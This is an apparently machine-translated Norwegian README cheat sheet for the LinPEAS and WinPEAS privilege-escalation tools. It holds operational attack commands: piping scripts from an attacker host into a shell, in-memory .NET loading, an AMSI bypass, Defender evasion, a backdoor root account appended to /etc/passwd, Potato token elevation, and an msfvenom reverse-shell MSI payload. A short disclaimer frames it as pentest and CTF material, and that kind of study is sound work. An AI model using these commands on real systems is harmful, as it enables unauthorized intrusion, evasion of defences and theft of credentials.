<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# 🦹 PEASS-ng (LinPEAS & WinPEAS) - Komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗ ███████╗ █████╗ ███████╗███████╗      ███╗   ██╗ ██████╗ 
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝      ████╗  ██║██╔════╝ 
  ██████╔╝█████╗  ███████║███████╗███████╗█████╗██╔██╗ ██║██║  ███╗
  ██╔═══╝ ██╔══╝  ██╔══██║╚════██║╚════██║╚════╝██║╚██╗██║██║   ██║
  ██║     ███████╗██║  ██║███████║███████║      ██║ ╚████║╚██████╔╝
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝      ╚═╝  ╚═══╝ ╚═════╝ 
             LinPEAS & WinPEAS Privilege Escalation Suite
```
<p align="center">
  <img src="https://img.shields.io/badge/PEASS--ng-PrivEsc-red?style=for-the-badge" alt="PEASS-ng">
  <img src="https://img.shields.io/badge/LinPEAS-Linux_PrivEsc-blue?style=for-the-badge" alt="LinPEAS">
  <img src="https://img.shields.io/badge/WinPEAS-Windows_PrivEsc-orange?style=for-the-badge" alt="WinPEAS">
  <img src="https://img.shields.io/badge/Automated-Enumeration-green?style=for-the-badge" alt="Automatisert">
</p>

<p align="center">
  <b>> Verdens mest populære automatiserte rettighetsopptrappingsverktøy for Linux- og Windows-systemer</b>
</p>

---

## 📋 Innholdsfortegnelse

– [Introduksjon](#-introduksjon)
- [Color Legend & How to Read Output](#-color-legend--how-to-read-output)
- [LinPEAS (Linux Privilege Escalation)](#-linpeas-linux-privilege-eskalering)
  - [Nedlasting og kjøring i minne](#nedlasting--i-minne-kjøring)
  - [Kommandolinjealternativer](#kommandolinjealternativer)
  - [Core Vectors Checked by LinPEAS](#core-vectors-checked-by-linpeas)
  - [Stealth & AV Evasion](#stealth--av-evasion)
- [WinPEAS (Windows Privilege Escalation)](#-winpeas-windows-privilege-eskalering)
  - [Utførelsesmetoder (.exe vs .bat)](#execution-methods-exe-vs-bat)
  - [Running WinPEAS in Memory](#running-winpeas-in-memory)
  - [Core Vectors Checked by WinPEAS](#core-vectors-checked-by-winpeas)
  - [Omgå Windows Defender og AMSI](#bypassing-windows-defender--amsi)
- [Tolking av høyprioriterte funn](#-tolker-høyprioriterte funn)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
– [Tips og beste fremgangsmåter](#-tips--beste praksis)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)
- [Ressurser](#-ressurser)

---

## 🎯 Introduksjon

**PEASS-ng** (Privilege Escalation Awesome Scripts SUITE - ny generasjon), skapt av Carlos Polop, er de-facto standardsamlingen av automatiserte revisjonsverktøy som brukes til å avdekke privilegieskaleringsvektorer på kompromitterte systemer:

- **LinPEAS:** Et alt-i-ett Bash-skript som søker etter feilkonfigurasjoner, legitimasjon, skrivbare filer, SUID-binærfiler, kjerneutnyttelser, cron-jobber og containere på Linux/Unix-systemer.
- **WinPEAS:** Tilgjengelig som et frittstående kompilert .NET binært (`winPEASany.exe`, `winPEASx64.exe`) og lett batchskript (`winPEAS.bat`) for revisjon av Windows-arbeidsstasjoner, domenemedlemmer og servere.

---

## 🎨 Fargeforklaring og hvordan du leser utdata

Den definerende kraften til PEASS er dets automatiserte fargevurderingssystem:

| Farge | Betydning | Betydning |
|-------|--------------|--------|
| 🔴 **RØD/GUL** | 🚨 **KRITISK (99 % PrivEsc)** | Svært pålitelig privilegieeskaleringsvektor. Må sjekkes umiddelbart! |
| 🔴 **RØD** | ⚠️ **Interessant** | Uvanlig konfigurasjon, ikke-standardinnstilling eller legitimasjonskandidat. |
| 🟡 **GUL** | ℹ️ **Informativ** | Merkbare funn som kan være en del av en utnyttelseskjede. |
| 🔵 **CYAN / BLÅ** | 👥 **Kontekst** | Brukere, grupper og standard systeminformasjon. |

> **Gylden regel:** Bla direkte til **RØD/GUL** høydepunkter først! Hvis du ser tekst med gul bakgrunn og røde bokstaver, er en utnyttelsesvektor nesten garantert.

---

## 🐧 LinPEAS (Linux Privilege Escalation)

### Nedlasting og kjøring i minnet

Du trenger sjelden å skrive `linpeas.sh` til disk. Kjør den direkte i minnet ved å bruke standard UNIX-verktøy:
```bash
# 1. From attacker Python web server directly into bash
curl -L http://10.10.14.5:8000/linpeas.sh | sh

# Alternative using wget
wget -q -O - http://10.10.14.5:8000/linpeas.sh | sh

# 2. Download from official GitHub directly (if target has outbound internet access)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 3. Save output to file and review with colors preserved
./linpeas.sh -a > /tmp/linpeas.txt
less -r /tmp/linpeas.txt
```
### Kommandolinjealternativer
```bash
# Run all checks (including slower exhaustive searches)
./linpeas.sh -a

# Fast mode (skips slow regex / deep file checks)
./linpeas.sh -q

# Password provided for automated 'sudo -l' testing
./linpeas.sh -p 'KnownPassword123'

# Network-only checks (active connections, ARP cache, listening ports)
./linpeas.sh -N

# System information only
./linpeas.sh -s
```
### Kjernevektorer sjekket av LinPEAS

1. **Sudo feilkonfigurasjoner (`sudo -l`):**
   - Kommandoer som kan kjøres som root uten passord (`NOPASSWD`).
   - Sudo token gjenbruk / CVE-2021-3156 (Baron Samedit).
2. **SUID / SGID-binærer:**
   - Binærfiler med root-tillatelser (`chmod +s`). Kryssreferert mot **GTFOBins**.
3. **Linux-funksjoner:**
   - Binærfiler med forhøyede muligheter som `cap_setuid+ep` (f.eks. `python3`, `tar`, `perl`).
4. **Planlagte oppgaver og tidtakere:**
   - Crontabs (`/etc/crontab`, `/var/spool/cron/*`) og skrivbare planlagte skript.
   - Systemd timer (`systemctl list-timers`).
5. **Kapring av sti og miljø:**
   - Skrivbare kataloger i `$PATH`, relative kommandooppslag i skript.
6. **Kjerneutnyttelse:**
   - Kjerneversjon sjekket mot kjente utnyttelser (Dirty COW, Dirty Pipe, OverlayFS).
7. **NFS Root Squashing:**
   - Delte kataloger montert med `no_root_squash` i `/etc/exports`.
8. **Innsamling av legitimasjon:**
   - Klartekstpassord i `.bash_history`, konfigurasjonsfiler (`wp-config.php`, `.env`), SSH-nøkler (`id_rsa`) og minnedumper.

---

## 🪟 WinPEAS (Windows Privilege Escalation)

### Utførelsesmetoder (.exe vs. .bat)

WinPEAS leveres i flere formater:
- **`winPEASx64.exe` / `winPEASany.exe`:** Skrevet i C#/.NET. Mest omfattende; utfører dype register-, API- og legitimasjonssjekker.
- **`winPEAS.bat`:** Vanlig batchskript. Svært kompatibel med eldre Windows-versjoner, krever ingen .NET-avhengigheter og unngår visse statiske binære deteksjoner.
```cmd
:: Run winPEAS binary with full color output
winPEASx64.exe

:: Run stealthily and redirect to text file
winPEASx64.exe > C:\Windows\Temp\out.txt

:: Fast check without heavy registry and file searches
winPEASx64.exe quiet
```
### Kjører WinPEAS i minnet

For å unngå å lagre filer på disk på reviderte arbeidsstasjoner, last inn WinPEAS direkte i PowerShell-minnet:
```powershell
# In-memory execution using Net.WebClient
$pe = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.5:8000/winPEASx64.exe')
[System.Reflection.Assembly]::Load($pe)
[winPEAS.Program]::Main("")
```
### Kjernevektorer sjekket av WinPEAS

1. **Tjenestetillatelser og unoterte baner:**
   - **Unoterte tjenestebaner:** Tjener binære baner med mellomrom og ingen anførselstegn (`C:\Program Files\App\service.exe` -> angriper plasserer `C:\Program.exe`).
   - **Svake tjenestetillatelser:** Ikke-administratorbrukere som har `SERVICE_ALL_ACCESS` eller `SERVICE_CHANGE_CONFIG`.
2. **DLL-kapring:**
   - Tjenester som forsøker å laste inn ikke-eksisterende DLL-er fra brukerskrivbare kataloger.
3. **AlwaysInstallElevated:**
   - Registernøkler `AlwaysInstallElevated = 1` som lar enhver bruker installere forhøyede MSI-pakker med `msiexec`.
4. **Tokenprivilegier (SeImpersonate / SeAssignPrimaryToken):**
   - Kan utnyttes via Potato-utnyttelse (SweetPotato, GodPotato, PrintSpoofer) for å heve fra tjenestekontoer (`IIS APPPOOL`, `LOCAL SERVICE`) til `NT AUTHORITY\SYSTEM`.
5. **Legitimasjonsbutikker og autologon:**
   - Klartekstpassord i registeret (`DefaultPassword` i Winlogon).
   - Lagrede RDP-tilkoblinger, Vault-legitimasjon, DPAPI-blobber, PuTTY-økter, WiFi-passord.
6. **SAM & SYSTEM Backup-filer:**
   - Skrivbare eller lesbare kopier av `C:\Windows\Repair\SAM` eller `C:\Windows\System32\config\RegBack\SAM`.

### Omgå Windows Defender og AMSI

Windows Defender flagger aktivt kompilerte versjoner av `winPEASx64.exe`. For å kjøre WinPEAS i overvåkede miljøer:
```powershell
# 1. Obfuscate winPEAS binary using Invisibility / Donut or custom compiler
# 2. Patch AMSI in PowerShell session before running in memory:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 3. Alternatively, fall back to winPEAS.bat (often unflagged by AV):
curl.exe http://10.10.14.5:8000/winPEAS.bat -o %TEMP%\wp.bat && %TEMP%\wp.bat
```
---

## 🎯 Tolking av høyprioriterte funn

### 1. LinPEAS: Skrivbar `/etc/passwd`
Hvis LinPEAS merker `/etc/passwd` i **RØD/GUL**:
```bash
# Generate password hash:
openssl passwd -1 -salt evil SaltPass123
# Append root user:
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```
### 2. WinPEAS: `SeImpersonatePrivilege` Present
Hvis du holder `SeImpersonatePrivilege`:
```powershell
# Elevate instantly using GodPotato or PrintSpoofer:
.\GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
```
### 3. WinPEAS: `AlwaysInstallElevated` Sett til 1
```powershell
# Generate malicious MSI payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o priv.msi
# Run installer as low-privileged user:
msiexec /quiet /qn /i priv.msi
```
---

## 📊 Hurtigreferansetabell

| Mål | Kommando | Formål |
|--------|--------|--------|
| **Linux (fjernkontroll)** | `curl -L http://<IP>/linpeas.sh \| sh` | Utførelse i minnet uten å berøre disk |
| **Linux (lokal)** | `./linpeas.sh -a > out.txt` | Fullstendig revisjon lagret i tekstfil |
| **Linux (Rask)** | `./linpeas.sh -q` | Rask skanning hopper over langsomme filsøk |
| **Windows (CLI)** | `winPEASx64.exe quiet` | Rask utførelse med redusert støy |
| **Windows (minne)**| `[System.Reflection.Assembly]::Load($pe)` | Last inn binær .NET i minnet via PowerShell |
| **Windows (Batch)** | `winPEAS.bat` | Avhengighetsfri utførelse for legacy/AV-unndragelse |

---

## 💡 Tips og beste fremgangsmåter

1. **Se gjennom utdata ved å bruke `less -r`:**
   Når du omdirigerer utdata til en fil (`./linpeas.sh > linpeas.txt`), må du alltid se den med `less -r linpeas.txt` eller `cat linpeas.txt` slik at terminale ANSI-fargeescape-koder gjengis riktig.
2. **Overføring via port 80/443:**
   Når du setter LinPEAS eller WinPEAS på angriperboksen din, vert webserveren din på port `80` eller `443` ved å bruke `python3 -m http.server 80` for å omgå strenge regler for utgang av målbrannmur.
3. **Ikke overse skjult legitimasjon:**
   Sjekk delene "Interessante filer" og "Cloud Credentials" i LinPEAS-utdata; ofte gir ren tekst API-tokens eller AWS-legitimasjon høyere privilegier enn en lokal utnyttelse.

---

## ⚠️ Juridisk ansvarsfraskrivelse

> **VIKTIG:** PEASS-ng-skript utfører omfattende intern revisjon og konfigurasjonsoppdagelse. De må kun utføres på systemer der du har dokumentert tillatelse under autoriserte penetrasjonstester, CTF-øvelser eller interne sikkerhetsrevisjoner.

---

## 📚 Ressurser

- [PEASS-ng offisielle GitHub-lager](https://github.com/carlospolop/PEASS-ng)
- [HackTricks Cloud & Privilege Escalation Bible](https://book.hacktricks.xyz/)
- [GTFOBins - Unix Binaries Exploitation](https://gtfobins.github.io/)
- [LOLBAS - Windows Living Off The Land](https://lolbas-project.github.io/)